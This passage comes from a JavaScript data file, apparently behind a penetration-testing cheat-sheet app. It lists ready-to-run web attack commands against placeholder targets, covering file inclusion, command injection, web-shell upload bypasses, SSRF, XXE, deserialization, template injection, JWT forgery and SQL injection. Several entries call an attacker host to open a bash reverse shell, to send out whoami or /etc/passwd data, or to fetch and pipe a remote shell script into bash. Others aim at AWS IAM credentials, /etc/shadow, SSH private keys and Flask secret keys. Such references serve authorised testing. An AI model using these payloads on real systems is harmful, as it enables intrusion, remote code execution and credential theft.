          { title: "Wfuzz Directory Discovery", desc: "Directory fuzzing with wfuzz", cmd: "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --hc 404 http://<TARGET_IP>/FUZZ", tags: ["tool"] },
        ]
      },
      {
        name: "Parameter Discovery & Fuzzing",
        commands: [
          { title: "FFUF GET Parameter Fuzzing", desc: "Discover hidden GET parameters", cmd: "ffuf -u 'http://<TARGET_IP>/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <FILTER_SIZE>", tags: ["essential", "tool"] },
          { title: "FFUF POST Parameter Fuzzing", desc: "Discover hidden POST parameters", cmd: "ffuf -u http://<TARGET_IP>/page -X POST -d 'FUZZ=test' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <FILTER_SIZE>", tags: ["essential", "tool"] },
          { title: "FFUF Value Fuzzing", desc: "Fuzz parameter values", cmd: "ffuf -u 'http://<TARGET_IP>/page?id=FUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt -fs <FILTER_SIZE>", tags: ["tool"] },
          { title: "Wfuzz POST Parameter Fuzz", desc: "Fuzz POST data with wfuzz", cmd: "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -d 'FUZZ=test' --hc 404 http://<TARGET_IP>/page", tags: ["tool"] },
          { title: "FFUF Recursive Fuzzing", desc: "Recursive directory fuzzing with filters", cmd: "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -recursion-depth 2 -e .php,.html,.txt -fs <FILTER_SIZE>", tags: ["tool"] },
          { title: "FFUF with Cookie Auth", desc: "Fuzz with authenticated session", cmd: "ffuf -u http://<TARGET_IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 'session=<COOKIE>' -fs <FILTER_SIZE>", tags: ["tool"] },
        ]
      },
      {
        name: "Local File Inclusion",
        commands: [
          { title: "LFI Basic Traversal", desc: "Basic directory traversal to read /etc/passwd", cmd: "curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd'", tags: ["essential"] },
          { title: "LFI Null Byte Bypass", desc: "Null byte to bypass extension appending (PHP <5.3)", cmd: "curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd%00'", tags: ["essential"], note: "Works on PHP < 5.3.4" },
          { title: "LFI Double Encoding", desc: "Double URL-encode traversal characters", cmd: "curl 'http://<TARGET_IP>/page?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'", tags: ["advanced"] },
          { title: "LFI PHP Base64 Wrapper", desc: "Read PHP source code via base64 wrapper", cmd: "curl 'http://<TARGET_IP>/page?file=php://filter/convert.base64-encode/resource=index.php'", tags: ["essential"] },
          { title: "LFI PHP Input Wrapper", desc: "Execute PHP code via input wrapper", cmd: "curl -X POST 'http://<TARGET_IP>/page?file=php://input' -d '<?php system(\"id\"); ?>'", tags: ["essential"] },
          { title: "LFI Data Wrapper", desc: "Execute PHP via data:// wrapper", cmd: "curl 'http://<TARGET_IP>/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id'", tags: ["advanced"] },
          { title: "LFI Expect Wrapper", desc: "Execute commands via expect wrapper", cmd: "curl 'http://<TARGET_IP>/page?file=expect://id'", tags: ["advanced"], note: "Requires expect module enabled" },
          { title: "LFI Log Poisoning (Apache)", desc: "Poison Apache access log then include it", cmds: ["curl -A '<?php system($_GET[\"cmd\"]); ?>' http://<TARGET_IP>/", "curl 'http://<TARGET_IP>/page?file=../../../../var/log/apache2/access.log&cmd=id'"], tags: ["advanced"], note: "Log path varies: /var/log/apache2/access.log, /var/log/httpd/access_log" },
          { title: "LFI Log Poisoning (SSH)", desc: "Poison auth.log via SSH then include it", cmds: ["ssh '<?php system($_GET[\"cmd\"]); ?>'@<TARGET_IP>", "curl 'http://<TARGET_IP>/page?file=../../../../var/log/auth.log&cmd=id'"], tags: ["advanced"] },
          { title: "LFI /proc/self/environ", desc: "Include process environment variables", cmd: "curl 'http://<TARGET_IP>/page?file=../../../../proc/self/environ'", tags: ["advanced"] },
          { title: "LFI Common Linux Files", desc: "Important files to check via LFI on Linux", cmds: ["curl 'http://<TARGET_IP>/page?file=../../../../etc/passwd'", "curl 'http://<TARGET_IP>/page?file=../../../../etc/shadow'", "curl 'http://<TARGET_IP>/page?file=../../../../etc/hosts'", "curl 'http://<TARGET_IP>/page?file=../../../../home/<USER>/.ssh/id_rsa'", "curl 'http://<TARGET_IP>/page?file=../../../../etc/crontab'"], tags: ["essential"] },
          { title: "LFI Common Windows Files", desc: "Important files to check via LFI on Windows", cmds: ["curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts'", "curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\win.ini'", "curl 'http://<TARGET_IP>/page?file=..\\..\\..\\..\\windows\\system.ini'"], tags: ["essential"] },
        ]
      },
      {
        name: "Remote File Inclusion",
        commands: [
          { title: "RFI Basic Inclusion", desc: "Include a remote PHP shell", cmd: "curl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.php'", tags: ["essential"], note: "Requires allow_url_include=On in PHP" },
          { title: "RFI with Null Byte", desc: "RFI with null byte to bypass extension appending", cmd: "curl 'http://<TARGET_IP>/page?file=http://<ATTACKER_IP>/shell.txt%00'", tags: ["essential"] },
          { title: "RFI SMB Share (Windows)", desc: "Include file from attacker SMB share on Windows target", cmd: "curl 'http://<TARGET_IP>/page?file=\\\\<ATTACKER_IP>\\share\\shell.php'", tags: ["advanced"] },
          { title: "Host RFI Payload", desc: "Start a web server to host RFI payloads", cmd: "python3 -m http.server 80", tags: ["essential"] },
        ]
      },
      {
        name: "OS Command Injection",
        commands: [
          { title: "Command Injection Semicolon", desc: "Inject command using semicolon separator", cmd: "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;id'", tags: ["essential"] },
          { title: "Command Injection Pipe", desc: "Inject command using pipe operator", cmd: "curl 'http://<TARGET_IP>/page?ip=127.0.0.1|id'", tags: ["essential"] },
          { title: "Command Injection OR", desc: "Inject using logical OR", cmd: "curl 'http://<TARGET_IP>/page?ip=||id'", tags: ["essential"] },
          { title: "Command Injection AND", desc: "Inject using logical AND", cmd: "curl 'http://<TARGET_IP>/page?ip=127.0.0.1&&id'", tags: ["essential"] },
          { title: "Command Injection Substitution", desc: "Inject via command substitution", cmd: "curl 'http://<TARGET_IP>/page?ip=$(id)'", tags: ["essential"] },
          { title: "Command Injection Backticks", desc: "Inject via backtick substitution", cmd: "curl 'http://<TARGET_IP>/page?ip=`id`'", tags: ["essential"] },
          { title: "Command Injection Newline", desc: "Inject command with URL-encoded newline", cmd: "curl 'http://<TARGET_IP>/page?ip=127.0.0.1%0aid'", tags: ["advanced"] },
          { title: "Blind Command Injection (Time)", desc: "Detect blind injection with sleep delay", cmd: "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;sleep+5'", tags: ["essential"] },
          { title: "Blind Command Injection (OOB)", desc: "Detect blind injection via out-of-band DNS/HTTP", cmds: ["curl 'http://<TARGET_IP>/page?ip=127.0.0.1;curl+http://<ATTACKER_IP>/$(whoami)'", "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;nslookup+$(whoami).<ATTACKER_DOMAIN>'"], tags: ["advanced"] },
          { title: "Command Injection Rev Shell", desc: "Inject a reverse shell command", cmd: "curl 'http://<TARGET_IP>/page?ip=127.0.0.1;bash+-c+\"bash+-i+>%26+/dev/tcp/<ATTACKER_IP>/<PORT>+0>%261\"'", tags: ["advanced"] },
        ]
      },
      {
        name: "Unrestricted File Upload",
        commands: [
          { title: "Upload PHP Shell (Direct)", desc: "Upload a basic PHP web shell", cmd: "curl -F 'file=@shell.php' http://<TARGET_IP>/upload", tags: ["essential"] },
          { title: "Upload Double Extension Bypass", desc: "Bypass extension filter with double extension", cmd: "curl -F 'file=@shell.php.jpg' http://<TARGET_IP>/upload", tags: ["essential"] },
          { title: "Upload Content-Type Bypass", desc: "Bypass content-type validation", cmd: "curl -F 'file=@shell.php;type=image/jpeg' http://<TARGET_IP>/upload", tags: ["essential"] },
          { title: "Upload .htaccess Override", desc: "Upload .htaccess to make .jpg execute as PHP", cmds: ["echo 'AddType application/x-httpd-php .jpg' > .htaccess", "curl -F 'file=@.htaccess' http://<TARGET_IP>/upload", "curl -F 'file=@shell.jpg' http://<TARGET_IP>/upload"], tags: ["advanced"], note: "shell.jpg contains PHP code" },
          { title: "Upload Case Variation", desc: "Bypass with case-altered extension", cmd: "curl -F 'file=@shell.pHp' http://<TARGET_IP>/upload", tags: ["essential"] },
          { title: "Upload Alternate PHP Extensions", desc: "Try alternative PHP extensions", cmds: ["curl -F 'file=@shell.php5' http://<TARGET_IP>/upload", "curl -F 'file=@shell.phtml' http://<TARGET_IP>/upload", "curl -F 'file=@shell.phar' http://<TARGET_IP>/upload", "curl -F 'file=@shell.phps' http://<TARGET_IP>/upload"], tags: ["essential"] },
          { title: "Upload Magic Bytes Bypass", desc: "Prepend magic bytes to bypass file type check", cmd: "printf '\\x89\\x50\\x4e\\x47\\x0d\\x0a\\x1a\\x0a<?php system($_GET[\"cmd\"]); ?>' > shell.php.png", tags: ["advanced"] },
          { title: "Upload Null Byte (Legacy)", desc: "Null byte in filename to bypass filters", cmd: "curl -F 'file=@shell.php%00.jpg' http://<TARGET_IP>/upload", tags: ["advanced"] },
        ]
      },
      {
        name: "Server-Side Request Forgery",
        commands: [
          { title: "SSRF Localhost", desc: "Access internal services via localhost", cmd: "curl 'http://<TARGET_IP>/page?url=http://127.0.0.1/'", tags: ["essential"] },
          { title: "SSRF Localhost Bypass (Decimal)", desc: "Bypass filters using decimal IP", cmd: "curl 'http://<TARGET_IP>/page?url=http://2130706433/'", tags: ["advanced"], note: "2130706433 = 127.0.0.1 in decimal" },
          { title: "SSRF Localhost Bypass (Hex)", desc: "Bypass filters using hex IP", cmd: "curl 'http://<TARGET_IP>/page?url=http://0x7f000001/'", tags: ["advanced"] },
          { title: "SSRF Localhost Bypass (Short)", desc: "Bypass using shortened localhost", cmd: "curl 'http://<TARGET_IP>/page?url=http://0/'", tags: ["advanced"] },
          { title: "SSRF IPv6 Localhost", desc: "Bypass using IPv6 localhost", cmd: "curl 'http://<TARGET_IP>/page?url=http://[::1]/'", tags: ["advanced"] },
          { title: "SSRF AWS Metadata", desc: "Access AWS EC2 metadata endpoint", cmd: "curl 'http://<TARGET_IP>/page?url=http://169.254.169.254/latest/meta-data/'", tags: ["essential"] },
          { title: "SSRF AWS Credentials", desc: "Steal AWS IAM role credentials", cmd: "curl 'http://<TARGET_IP>/page?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>'", tags: ["essential"] },
          { title: "SSRF GCP Metadata", desc: "Access Google Cloud metadata endpoint", cmd: "curl 'http://<TARGET_IP>/page?url=http://metadata.google.internal/computeMetadata/v1/'", tags: ["advanced"] },
          { title: "SSRF Internal Port Scan", desc: "Scan internal ports via SSRF", cmd: "curl 'http://<TARGET_IP>/page?url=http://127.0.0.1:<PORT>/'", tags: ["essential"] },
          { title: "SSRF File Protocol", desc: "Read local files via file:// protocol", cmd: "curl 'http://<TARGET_IP>/page?url=file:///etc/passwd'", tags: ["essential"] },
        ]
      },
      {
        name: "XML External Entity Injection",
        commands: [
          { title: "XXE File Read (Linux)", desc: "Read local file via XXE", cmd: "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>' http://<TARGET_IP>/api", tags: ["essential"] },
          { title: "XXE File Read (Windows)", desc: "Read local file on Windows target", cmd: "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\">]><root>&xxe;</root>' http://<TARGET_IP>/api", tags: ["essential"] },
          { title: "XXE SSRF", desc: "Server-Side Request Forgery via XXE", cmd: "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:80/\">]><root>&xxe;</root>' http://<TARGET_IP>/api", tags: ["essential"] },
          { title: "XXE PHP Base64 Wrapper", desc: "Read PHP source via XXE with base64 encoding", cmd: "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\">]><root>&xxe;</root>' http://<TARGET_IP>/api", tags: ["advanced"] },
          { title: "XXE OOB Exfiltration", desc: "Out-of-band data exfiltration via XXE", cmd: "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://<ATTACKER_IP>/xxe.dtd\">%xxe;]><root>test</root>' http://<TARGET_IP>/api", tags: ["advanced"], note: "xxe.dtd: <!ENTITY % file SYSTEM 'file:///etc/passwd'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://<ATTACKER_IP>/?data=%file;\">'>%eval;%exfil;" },
          { title: "XXE Billion Laughs (DoS)", desc: "XML bomb for denial of service testing", cmd: "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><root>&lol2;</root>' http://<TARGET_IP>/api", tags: ["advanced"], note: "Use with caution - can crash services" },
          { title: "Blind XXE with OOB DTD", desc: "Exfiltrate data via out-of-band external DTD", cmds: ["# Host this as xxe.dtd on attacker:", "# <!ENTITY % file SYSTEM 'file:///etc/hostname'>", "# <!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://<ATTACKER_IP>/?d=%file;\">'>", "# %eval; %exfil;", "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://<ATTACKER_IP>/xxe.dtd\">%xxe;]><root>test</root>' http://<TARGET_IP>/api"], tags: ["advanced"] },
          { title: "Blind XXE Error-Based", desc: "Exfiltrate data through XML parsing errors", cmd: "curl -X POST -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM \\\"file:///nonexistent/%file;\\\">\">%eval;%error;]><root>test</root>' http://<TARGET_IP>/api", tags: ["advanced"], note: "Data appears in error message" },
          { title: "XXE via SVG Upload", desc: "XXE through SVG file upload", cmd: "echo '<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&xxe;</text></svg>' > xxe.svg", tags: ["advanced"], note: "Upload SVG to endpoints that process XML-based images" },
          { title: "XXE via DOCX/XLSX", desc: "Inject XXE into Office Open XML files", cmds: ["unzip document.docx -d xxe_doc", "# Edit xxe_doc/[Content_Types].xml or word/document.xml to add DOCTYPE with ENTITY", "cd xxe_doc && zip -r ../evil.docx ."], tags: ["advanced"], note: "DOCX/XLSX are ZIP archives containing XML files" },
          { title: "XXE via SOAP Request", desc: "XXE injection in SOAP web service", cmd: "curl -X POST -H 'Content-Type: text/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>' http://<TARGET_IP>/ws", tags: ["advanced"] },
          { title: "XInclude Attack", desc: "XXE alternative when you cannot control DOCTYPE", cmd: "curl -X POST -d '<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>' http://<TARGET_IP>/api", tags: ["advanced"], note: "Works when input is embedded into server-side XML" },
        ]
      },
      {
        name: "Insecure Deserialization",
        commands: [
          { title: "Ysoserial Java Payload (CommonsCollections1)", desc: "Generate Java deserialization payload", cmd: "java -jar ysoserial.jar CommonsCollections1 'ping -c 1 <ATTACKER_IP>' | base64 -w 0", tags: ["tool"] },
          { title: "Ysoserial Java Payload (CommonsCollections5)", desc: "Generate CC5 gadget chain payload", cmd: "java -jar ysoserial.jar CommonsCollections5 'bash -c {echo,<BASE64_REVSHELL>}|{base64,-d}|bash' | base64 -w 0", tags: ["tool"] },
          { title: "Ysoserial Java Payload (CommonsCollections7)", desc: "Generate CC7 gadget chain payload", cmd: "java -jar ysoserial.jar CommonsCollections7 'curl http://<ATTACKER_IP>/shell.sh|bash' | base64 -w 0", tags: ["tool"] },
          { title: "PHP Deserialization Payload", desc: "Craft PHP serialized object for injection", cmd: "php -r 'echo serialize(new stdClass());'", tags: ["advanced"], note: "Customize object with magic methods __wakeup() or __destruct() based on target class" },
          { title: "Python Pickle RCE", desc: "Generate malicious Python pickle payload", cmd: "python3 -c \"import pickle,os,base64; class P(object):\\n def __reduce__(self):\\n  return (os.system,('id',))\\nprint(base64.b64encode(pickle.dumps(P())).decode())\"", tags: ["advanced"] },
          { title: ".NET Ysoserial Payload", desc: "Generate .NET deserialization payload", cmd: "ysoserial.exe -g TypeConfuseDelegate -f Json.Net -c 'ping <ATTACKER_IP>' -o base64", tags: ["tool"], note: "Windows tool for .NET targets" },
        ]
      },
      {
        name: "Template Injection (SSTI)",
        commands: [
          { title: "SSTI Detection", desc: "Test for template injection with arithmetic", cmd: "curl 'http://<TARGET_IP>/page?name={{7*7}}'", tags: ["essential"], note: "If output shows 49, SSTI is confirmed" },
          { title: "SSTI Jinja2 Detection", desc: "Confirm Jinja2 template engine", cmd: "curl 'http://<TARGET_IP>/page?name={{7*\"7\"}}'", tags: ["essential"], note: "Jinja2 returns 7777777, Twig returns 49" },
          { title: "SSTI Jinja2 Config Dump", desc: "Dump Flask/Jinja2 configuration", cmd: "curl 'http://<TARGET_IP>/page?name={{config}}'", tags: ["essential"] },
          { title: "SSTI Jinja2 RCE (Python3)", desc: "Remote code execution via Jinja2", cmd: "curl \"http://<TARGET_IP>/page?name={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}\"", tags: ["essential"] },
          { title: "SSTI Jinja2 RCE (MRO Chain)", desc: "RCE via MRO class traversal", cmd: "curl \"http://<TARGET_IP>/page?name={{''.__class__.__mro__[1].__subclasses__()[<INDEX>]('id',shell=True,stdout=-1).communicate()}}\"", tags: ["advanced"], note: "Find subprocess.Popen index with: {{''.__class__.__mro__[1].__subclasses__()}}" },
          { title: "SSTI Twig RCE", desc: "Remote code execution via Twig (PHP)", cmd: "curl 'http://<TARGET_IP>/page?name={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}'", tags: ["advanced"] },
          { title: "SSTI Freemarker RCE", desc: "Remote code execution via Freemarker (Java)", cmd: "curl 'http://<TARGET_IP>/page?name=<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}'", tags: ["advanced"] },
          { title: "SSTI ERB Ruby", desc: "Code execution via ERB templates", cmd: "curl 'http://<TARGET_IP>/page?name=<%25%3d+system(\"id\")+%25>'", tags: ["advanced"] },
          { title: "SSTI Identify Engine", desc: "Polyglot payload to identify template engine", cmd: "curl 'http://<TARGET_IP>/page?name=${{<%25[%25'\"}}%25>.'", tags: ["essential"], note: "Check error messages to identify template engine" },
          { title: "SSTI Jinja2 Class Traversal", desc: "Access classes via MRO for RCE", cmd: "curl \"http://<TARGET_IP>/page?name={{''.__class__.__mro__[1].__subclasses__()}}\"", tags: ["essential"], note: "Find subprocess.Popen index then use it for command execution" },
          { title: "SSTI Jinja2 Lipsum RCE", desc: "RCE via lipsum global in Jinja2", cmd: "curl \"http://<TARGET_IP>/page?name={{lipsum.__globals__['os'].popen('id').read()}}\"", tags: ["advanced"] },
          { title: "SSTI Jinja2 cycler RCE", desc: "RCE via cycler object in Jinja2", cmd: "curl \"http://<TARGET_IP>/page?name={{cycler.__init__.__globals__.os.popen('id').read()}}\"", tags: ["advanced"] },
          { title: "SSTI Jinja2 Dump SECRET_KEY", desc: "Extract Flask secret key via config", cmd: "curl 'http://<TARGET_IP>/page?name={{config.SECRET_KEY}}'", tags: ["essential"] },
          { title: "SSTI Twig Detection", desc: "Test for Twig template engine (PHP)", cmd: "curl 'http://<TARGET_IP>/page?name={{7*7}}'", tags: ["essential"], note: "Twig returns 49 for {{7*7}}" },
          { title: "SSTI Freemarker Detection", desc: "Detect Freemarker via assign", cmd: "curl 'http://<TARGET_IP>/page?name=${7*7}'", tags: ["essential"], note: "Freemarker uses ${} syntax" },
          { title: "SSTI Mako RCE (Python)", desc: "RCE via Mako template engine", cmd: "curl \"http://<TARGET_IP>/page?name=<%25import os;x=os.popen('id').read()%25>${x}\"", tags: ["advanced"] },
          { title: "SSTI Handlebars RCE", desc: "RCE via Handlebars template (Node.js)", cmd: "curl \"http://<TARGET_IP>/page?name={{#with 'constructor' as |a|}}{{#with (lookup . a)}}{{this ('return require(\\\"child_process\\\").execSync(\\\"id\\\")')()}}{{/with}}{{/with}}\"", tags: ["advanced"] },
        ]
      },
      {
        name: "JWT Attacks",
        commands: [
          { title: "JWT Decode (Manual)", desc: "Decode JWT token parts manually", cmd: "echo '<JWT_TOKEN>' | cut -d. -f2 | base64 -d 2>/dev/null | jq .", tags: ["essential"] },
          { title: "JWT None Algorithm Attack", desc: "Forge JWT with alg:none to bypass signature", cmds: ["# Change header to {\"alg\":\"none\",\"typ\":\"JWT\"}", "# Remove the signature (third part after second dot)", "# Send: header.payload."], tags: ["essential"], note: "Works if server doesn't validate algorithm" },
          { title: "JWT Weak Secret Crack (Hashcat)", desc: "Crack JWT HMAC secret with hashcat", cmd: "hashcat -m 16500 jwt_token.txt /usr/share/wordlists/rockyou.txt", tags: ["essential"] },
          { title: "JWT Weak Secret Crack (john)", desc: "Crack JWT HMAC secret with john", cmd: "john jwt_token.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256", tags: ["essential"] },
          { title: "JWT Algorithm Confusion (RS256 to HS256)", desc: "Switch RS256 to HS256 and sign with public key", cmds: ["# 1. Get the server's public key", "# 2. Change alg from RS256 to HS256", "# 3. Sign the JWT using the public key as HMAC secret", "python3 jwt_tool.py <JWT_TOKEN> -X k -pk public.pem"], tags: ["advanced"], note: "Works if server uses same key variable for both algorithms" },
          { title: "JWT Tool Full Scan", desc: "Automated JWT vulnerability scanning", cmd: "python3 jwt_tool.py <JWT_TOKEN> -M at -t 'http://<TARGET_IP>/api/protected' -rh 'Authorization: Bearer'", tags: ["tool"] },
          { title: "JWT KID Injection", desc: "Exploit kid header parameter for key injection", cmd: "python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv '../../../../../../dev/null' -S hs256 -p ''", tags: ["advanced"], note: "kid parameter may be used to read arbitrary files as signing key" },
        ]
      },
      {
        name: "CORS & HTTP Smuggling",
        commands: [
          { title: "CORS Misconfiguration Test", desc: "Test if origin is reflected in CORS headers", cmd: "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/ | grep -i 'Access-Control-Allow'", tags: ["essential"] },
          { title: "CORS Null Origin Test", desc: "Test if null origin is allowed", cmd: "curl -s -I -H 'Origin: null' http://<TARGET_IP>/ | grep -i 'Access-Control-Allow'", tags: ["essential"] },
          { title: "CORS Wildcard Check", desc: "Check if CORS allows all origins with credentials", cmd: "curl -s -I -H 'Origin: https://evil.com' http://<TARGET_IP>/api/ | grep -E 'Access-Control-Allow-(Origin|Credentials)'", tags: ["essential"], note: "Vulnerable if Origin is reflected AND credentials: true" },
          { title: "HTTP Request Smuggling CL.TE", desc: "CL.TE smuggling test payload", cmd: "printf 'POST / HTTP/1.1\\r\\nHost: <TARGET_IP>\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nX' | nc <TARGET_IP> 80", tags: ["advanced"], note: "Front-end uses Content-Length, back-end uses Transfer-Encoding" },
          { title: "HTTP Request Smuggling TE.CL", desc: "TE.CL smuggling test payload", cmd: "printf 'POST / HTTP/1.1\\r\\nHost: <TARGET_IP>\\r\\nContent-Length: 3\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n1\\r\\nX\\r\\n0\\r\\n\\r\\n' | nc <TARGET_IP> 80", tags: ["advanced"], note: "Front-end uses Transfer-Encoding, back-end uses Content-Length" },
          { title: "Smuggler Scanner", desc: "Automated HTTP request smuggling detection", cmd: "python3 smuggler.py -u http://<TARGET_IP>/", tags: ["tool"] },
          { title: "WebSocket Connection Test", desc: "Connect to a WebSocket endpoint", cmd: "websocat ws://<TARGET_IP>:<PORT>/ws", tags: ["tool"] },
          { title: "WebSocket XSS via Message", desc: "Send XSS payload through WebSocket", cmd: "websocat ws://<TARGET_IP>:<PORT>/ws <<< '<script>alert(1)</script>'", tags: ["advanced"] },
          { title: "WebSocket SQLi via Message", desc: "Send SQLi payload through WebSocket", cmd: "websocat ws://<TARGET_IP>:<PORT>/ws <<< '{\"id\": \"1 OR 1=1-- -\"}'", tags: ["advanced"] },
        ]
      }
    ]
  },

  // ─────────────────────────────────────────────
  // 4. Database Exploitation via Injection
  // ─────────────────────────────────────────────
  {
    id: "sqli",
    name: "Database Exploitation via Injection",
    icon: "🗃️",
    description: "Detect and exploit SQL injection vulnerabilities to extract data, escalate privileges, and achieve remote code execution across major database platforms.",
    subcategories: [
      {
        name: "Injection Detection",
        commands: [
          { title: "SQLi Single Quote Test", desc: "Test for SQL injection with single quote", cmd: "curl \"http://<TARGET_IP>/page?id=1'\"", tags: ["essential"] },
          { title: "SQLi Double Quote Test", desc: "Test for SQL injection with double quote", cmd: "curl 'http://<TARGET_IP>/page?id=1\"'", tags: ["essential"] },
          { title: "SQLi OR True Test", desc: "Boolean test — always true condition", cmd: "curl \"http://<TARGET_IP>/page?id=1' OR '1'='1\"", tags: ["essential"] },
          { title: "SQLi OR False Test", desc: "Boolean test — always false condition", cmd: "curl \"http://<TARGET_IP>/page?id=1' OR '1'='2\"", tags: ["essential"] },
          { title: "SQLi AND True Test", desc: "Boolean test — AND always true", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND '1'='1\"", tags: ["essential"] },
          { title: "SQLi AND False Test", desc: "Boolean test — AND always false", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND '1'='2\"", tags: ["essential"] },
          { title: "SQLi Comment Test", desc: "Test with comment to strip remainder of query", cmd: "curl \"http://<TARGET_IP>/page?id=1'-- -\"", tags: ["essential"] },
          { title: "SQLi Time-Based Detection", desc: "Detect blind SQLi via time delay", cmd: "curl \"http://<TARGET_IP>/page?id=1' AND SLEEP(5)-- -\"", tags: ["essential"] },
          { title: "SQLi Stacked Query Test", desc: "Test for stacked query support", cmd: "curl \"http://<TARGET_IP>/page?id=1'; SELECT 1-- -\"", tags: ["advanced"] },
          { title: "SQLi ORDER BY Column Count", desc: "Determine number of columns via ORDER BY", cmds: ["curl \"http://<TARGET_IP>/page?id=1' ORDER BY 1-- -\"", "curl \"http://<TARGET_IP>/page?id=1' ORDER BY 2-- -\"", "curl \"http://<TARGET_IP>/page?id=1' ORDER BY 3-- -\""], tags: ["essential"], note: "Increment until error — last success = column count" },
        ]
      },
      {
        name: "UNION Extraction",
        commands: [
          { title: "UNION Column Detection", desc: "Find number of columns and visible positions", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,2,3-- -\"", tags: ["essential"], note: "Adjust number of columns to match ORDER BY result" },
          { title: "MySQL Version via UNION", desc: "Extract MySQL version", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,@@version,3-- -\"", tags: ["essential"] },
          { title: "MySQL Current User via UNION", desc: "Extract current database user", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,user(),3-- -\"", tags: ["essential"] },
          { title: "MySQL Current Database", desc: "Extract current database name", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,database(),3-- -\"", tags: ["essential"] },
          { title: "MySQL List Databases", desc: "Enumerate all databases", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata-- -\"", tags: ["essential"] },
          { title: "MySQL List Tables", desc: "Enumerate tables in a database", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='<DATABASE>'-- -\"", tags: ["essential"] },
          { title: "MySQL List Columns", desc: "Enumerate columns in a table", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='<TABLE>'-- -\"", tags: ["essential"] },
          { title: "MySQL Dump Data", desc: "Extract data from specific columns", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,GROUP_CONCAT(<COL1>,0x3a,<COL2>),3 FROM <DATABASE>.<TABLE>-- -\"", tags: ["essential"] },
          { title: "MySQL Read File", desc: "Read file from filesystem via SQL", cmd: "curl \"http://<TARGET_IP>/page?id=-1' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -\"", tags: ["advanced"] },
